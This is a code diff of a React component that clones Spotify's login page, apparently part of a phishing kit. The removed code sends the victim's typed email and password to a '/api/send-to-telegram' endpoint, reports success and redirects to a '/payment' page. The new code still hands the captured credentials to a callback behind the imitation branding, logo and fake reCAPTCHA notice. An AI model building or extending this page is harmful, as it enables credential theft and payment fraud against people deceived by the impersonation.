@@ -2,198 +2,155 @@
 
 import type React from "react"
 
+import { useState } from "react"
+import { SpotifyLogo } from "@/components/spotify-logo"
 import { Button } from "@/components/ui/button"
 import { Input } from "@/components/ui/input"
-import { Label } from "@/components/ui/label"
-import { useState } from "react"
-import { useTranslation } from "@/lib/language-context"
+import { t, type Language } from "@/lib/translations"
+import Link from "next/link"
 
-export function SpotifyLoginForm({ onLoginSuccess }: { onLoginSuccess?: () => void }) {
+interface SpotifyLoginFormProps {
+  onLoginSuccess?: (email: string, password: string) => void
+  language?: Language
+}
+
+export function SpotifyLoginForm({ onLoginSuccess, language = "en" }: SpotifyLoginFormProps) {
   const [email, setEmail] = useState("")
   const [password, setPassword] = useState("")
-  const [isLoading, setIsLoading] = useState(false)
-  const [message, setMessage] = useState("")
-  const { t } = useTranslation()
 
-  const handleSubmit = async (e: React.FormEvent) => {
-    e.preventDefault()
-    setIsLoading(true)
-    setMessage("")
-
-    try {
-      const response = await fetch("/api/send-to-telegram", {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json",
-        },
-        body: JSON.stringify({
-          email,
-          password,
-        }),
-      })
-
-      const data = await response.json()
-
-      if (response.ok) {
-        setMessage("Login information sent successfully!")
-        setTimeout(() => {
-          if (onLoginSuccess) {
-            onLoginSuccess()
-          } else {
-            window.location.href = "/payment"
-          }
-        }, 500)
-      } else {
-        setMessage(data.error || "Failed to send login information")
-      }
-    } catch (error) {
-      setMessage("An error occurred. Please try again.")
-    } finally {
-      setIsLoading(false)
-    }
-  }
-
-  const handleSignUp = () => {
-    if (onLoginSuccess) {
-      onLoginSuccess()
-    } else {
-      window.location.href = "/payment"
+  const handleLogin = () => {
+    if (email && password) {
+      onLoginSuccess?.(email, password)
     }
   }
 
   return (
-    <div className="w-full max-w-md space-y-6 sm:space-y-8">
-      {/* Welcome Text */}
-      <h1 className="text-3xl sm:text-5xl font-bold text-white text-center">{t.login.welcomeBack}</h1>
+    <div className="w-full max-w-[324px] flex flex-col items-center px-4">
+      {/* Logo */}
+      <SpotifyLogo className="w-10 h-10 mb-8" />
 
-      {/* Login Form */}
-      <form onSubmit={handleSubmit} className="space-y-4">
-        <div className="space-y-2">
-          <Label htmlFor="email" className="text-sm font-bold text-white">
-            {t.login.emailLabel}
-          </Label>
-          <Input
-            id="email"
-            type="text"
-            placeholder=""
-            value={email}
-            onChange={(e) => setEmail(e.target.value)}
-            required
-            className="h-12 bg-[#121212] border-[#727272] text-white placeholder:text-[#727272] hover:border-white focus:border-white focus:ring-0 focus:ring-offset-0 rounded-md"
-          />
-        </div>
+      {/* Title */}
+      <h1 className="text-2xl sm:text-[32px] font-bold text-white mb-10 text-center">{t("login.title", language)}</h1>
 
-        <div className="space-y-2">
-          <Label htmlFor="password" className="text-sm font-bold text-white">
-            {t.login.passwordLabel}
-          </Label>
-          <Input
-            id="password"
-            type="password"
-            placeholder=""
-            value={password}
-            onChange={(e) => setPassword(e.target.value)}
-            required
-            className="h-12 bg-[#121212] border-[#727272] text-white placeholder:text-[#727272] hover:border-white focus:border-white focus:ring-0 focus:ring-offset-0 rounded-md"
-          />
-        </div>
+      {/* Email Input */}
+      <div className="w-full mb-2">
+        <label className="text-xs sm:text-sm font-bold text-white mb-2 block">{t("login.email", language)}</label>
+        <Input
+          type="text"
+          placeholder={t("login.email", language)}
+          value={email}
+          onChange={(e) => setEmail(e.target.value)}
+          className="w-full h-12 bg-[#121212] border border-[#727272] rounded-[4px] text-white placeholder:text-[#a7a7a7] px-4 focus:border-white focus:ring-0 focus-visible:ring-0 focus-visible:ring-offset-0 hover:border-[#fff]"
+        />
+      </div>
 
-        <Button
-          type="submit"
-          disabled={isLoading}
-          className="w-full h-12 bg-[#1ed760] hover:bg-[#1fdf64] text-black font-bold text-base rounded-full disabled:opacity-50"
-        >
-          {isLoading ? t.login.sending : t.login.continueButton}
-        </Button>
+      {/* Password Input */}
+      <div className="w-full mb-2 mt-4">
+        <label className="text-xs sm:text-sm font-bold text-white mb-2 block">{t("login.password", language)}</label>
+        <Input
+          type="password"
+          placeholder={t("login.password", language)}
+          value={password}
+          onChange={(e) => setPassword(e.target.value)}
+          className="w-full h-12 bg-[#121212] border border-[#727272] rounded-[4px] text-white placeholder:text-[#a7a7a7] px-4 focus:border-white focus:ring-0 focus-visible:ring-0 focus-visible:ring-offset-0 hover:border-[#fff]"
+        />
+      </div>
 
-        {message && (
-          <p className={`text-sm text-center ${message.includes("success") ? "text-[#1ed760]" : "text-red-500"}`}>
-            {message}
-          </p>
-        )}
-      </form>
+      {/* Continue Button */}
+      <Button
+        onClick={handleLogin}
+        disabled={!email || !password}
+        className="w-full h-12 bg-[#1ed760] hover:bg-[#1fdf64] disabled:bg-[#404040] disabled:text-[#a7a7a7] hover:scale-[1.04] text-black font-bold rounded-full mt-5 transition-all text-sm sm:text-base"
+      >
+        {t("login.logIn", language)}
+      </Button>
 
       {/* Divider */}
-      <div className="relative">
-        <div className="absolute inset-0 flex items-center">
-          <div className="w-full border-t border-[#727272]" />
-        </div>
-        <div className="relative flex justify-center text-sm">
-          <span className="px-4 bg-[#121212] text-white">{t.login.or}</span>
-        </div>
+      <div className="w-full flex items-center my-8">
+        <div className="flex-1 h-px bg-[#292929]" />
+        <span className="px-4 text-[#a7a7a7] text-xs sm:text-sm">or</span>
+        <div className="flex-1 h-px bg-[#292929]" />
       </div>
 
       {/* Social Login Buttons */}
-      <div className="space-y-3">
-        <Button
-          variant="outline"
-          className="w-full h-12 bg-transparent border-[#727272] hover:border-white text-white font-semibold rounded-full hover:bg-transparent text-sm sm:text-base"
-        >
-          <svg className="w-5 h-5 mr-2 sm:mr-3" viewBox="0 0 24 24">
-            <path
-              fill="#4285F4"
-              d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"
-            />
-            <path
-              fill="#34A853"
-              d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"
-            />
-            <path
-              fill="#FBBC05"
-              d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"
-            />
-            <path
-              fill="#EA4335"
-              d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"
-            />
-          </svg>
-          {t.login.continueWithGoogle}
-        </Button>
-
-        <Button
-          variant="outline"
-          className="w-full h-12 bg-transparent border-[#727272] hover:border-white text-white font-semibold rounded-full hover:bg-transparent text-sm sm:text-base"
-        >
-          <svg className="w-5 h-5 mr-2 sm:mr-3" viewBox="0 0 24 24" fill="#1877F2">
-            <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z" />
-          </svg>
-          {t.login.continueWithFacebook}
-        </Button>
-
-        <Button
-          variant="outline"
-          className="w-full h-12 bg-transparent border-[#727272] hover:border-white text-white font-semibold rounded-full hover:bg-transparent text-sm sm:text-base"
-        >
-          <svg className="w-5 h-5 mr-2 sm:mr-3" viewBox="0 0 24 24" fill="white">
-            <path d="M17.05 20.28c-.98.95-2.05.8-3.08.35-1.09-.46-2.09-.48-3.24 0-1.44.62-2.2.44-3.06-.35C2.79 15.25 3.51 7.59 9.05 7.31c1.35.07 2.29.74 3.08.8 1.18-.24 2.31-.93 3.57-.84 1.51.12 2.65.72 3.4 1.8-3.12 1.87-2.38 5.98.48 7.13-.57 1.5-1.31 2.99-2.54 4.09l.01-.01zM12.03 7.25c-.15-2.23 1.66-4.07 3.74-4.25.29 2.58-2.34 4.5-3.74 4.25z" />
-          </svg>
-          {t.login.continueWithApple}
-        </Button>
+      <div className="w-full space-y-2">
+        <SocialButton icon={<GoogleIcon />} label="Continue with Google" />
+        <SocialButton icon={<FacebookIcon />} label="Continue with Facebook" />
+        <SocialButton icon={<AppleIcon />} label="Continue with Apple" />
       </div>
 
       {/* Sign Up Link */}
-      <div className="text-center space-y-4 pt-4">
-        <p className="text-[#a7a7a7] text-sm">{t.login.noAccount}</p>
-        <button
-          onClick={handleSignUp}
-          className="text-white font-semibold underline hover:text-[#1ed760] text-sm bg-transparent border-0 cursor-pointer"
-        >
-          {t.login.signUp}
-        </button>
+      <div className="mt-10 text-center">
+        <span className="text-[#a7a7a7] text-sm sm:text-base">{t("login.noAccount", language)} </span>
+        <Link href="#" className="text-white underline hover:text-[#1ed760]">
+          {t("login.signUp", language)}
+        </Link>
       </div>
 
-      {/* Footer */}
-      <p className="text-[#727272] text-xs text-center pt-8">
-        {t.login.privacyText}{" "}
-        <a href="#" className="underline hover:text-white">
-          {t.login.privacyPolicy}
-        </a>{" "}
-        {t.login.and}{" "}
-        <a href="#" className="underline hover:text-white">
-          {t.login.termsOfService}
-        </a>{" "}
-        {t.login.apply}
+      {/* reCAPTCHA Notice */}
+      <p className="mt-8 text-[10px] sm:text-[11px] text-[#a7a7a7] text-center leading-relaxed">
+        This site is protected by reCAPTCHA and the Google{" "}
+        <Link href="#" className="underline">
+          Privacy Policy
+        </Link>{" "}
+        and{" "}
+        <Link href="#" className="underline">
+          Terms of Service
+        </Link>{" "}
+        apply.
       </p>
     </div>
+  )
+}
+
+function SocialButton({ icon, label }: { icon: React.ReactNode; label: string }) {
+  return (
+    <button className="w-full h-12 flex items-center justify-center gap-3 bg-transparent border border-[#727272] rounded-full text-white font-bold hover:border-white transition-colors relative text-xs sm:text-sm">
+      <span className="absolute left-4">{icon}</span>
+      <span>{label}</span>
+    </button>
+  )
+}
+
+function GoogleIcon() {
+  return (
+    <svg width="24" height="24" viewBox="0 0 24 24">
+      <path
+        fill="#EA4335"
+        d="M5.26644 9.76453C6.19903 6.93863 8.85469 4.90909 12.0002 4.90909C13.6912 4.90909 15.2184 5.50909 16.4184 6.49091L19.9093 3C17.7821 1.14545 15.0548 0 12.0002 0C7.27031 0 3.19799 2.6983 1.24023 6.65002L5.26644 9.76453Z"
+      />
+      <path
+        fill="#34A853"
+        d="M16.0406 18.0142C14.9508 18.718 13.5659 19.0926 12.0002 19.0926C8.86663 19.0926 6.21883 17.0785 5.27682 14.2695L1.2373 17.3366C3.19263 21.2953 7.26484 24.0017 12.0002 24.0017C14.9328 24.0017 17.7353 22.959 19.834 21.0012L16.0406 18.0142Z"
+      />
+      <path
+        fill="#4285F4"
+        d="M19.834 21.0012C22.0292 18.9528 23.4545 15.9038 23.4545 12.0001C23.4545 11.2909 23.3455 10.5274 23.1818 9.81824H12V14.4546H18.4364C18.1188 16.0138 17.2663 17.2275 16.0407 18.0143L19.834 21.0012Z"
+      />
+      <path
+        fill="#FBBC05"
+        d="M5.27698 14.2695C5.03833 13.5527 4.90909 12.7922 4.90909 12.0001C4.90909 11.2166 5.03444 10.4652 5.2662 9.76468L1.23999 6.65015C0.436587 8.25159 0 10.0715 0 12.0001C0 13.9164 0.444781 15.7286 1.23746 17.3366L5.27698 14.2695Z"
+      />
+    </svg>
+  )
+}
+
+function FacebookIcon() {
+  return (
+    <svg width="24" height="24" viewBox="0 0 24 24" fill="none">
+      <circle cx="12" cy="12" r="12" fill="#1877F2" />
+      <path
+        fill="#fff"
+        d="M16.671 15.469 17.203 12h-3.328V9.75c0-.95.465-1.875 1.956-1.875h1.513V5.156s-1.374-.234-2.686-.234c-2.742 0-4.533 1.662-4.533 4.672V12H7.078v3.469h3.047v8.385a12.09 12.09 0 0 0 3.75 0v-8.385h2.796Z"
+      />
+    </svg>
+  )
+}
+
+function AppleIcon() {
+  return (
+    <svg width="24" height="24" viewBox="0 0 24 24" fill="white">
+      <path d="M17.05 20.28c-.98.95-2.05.88-3.08.4-1.09-.5-2.08-.52-3.24 0-1.44.64-2.2.52-3.06-.4-4.84-5.02-4.12-12.66 1.38-12.96 1.35.07 2.29.74 3.08.8 1.18-.24 2.31-.93 3.57-.84 1.51.12 2.65.72 3.4 1.8-3.12 1.87-2.38 5.98.48 7.13-.57 1.5-1.31 2.99-2.53 4.07ZM12.03 7.25c-.15-2.23 1.66-4.07 3.74-4.25.29 2.58-2.34 4.5-3.74 4.25Z" />
+    </svg>
   )
 }
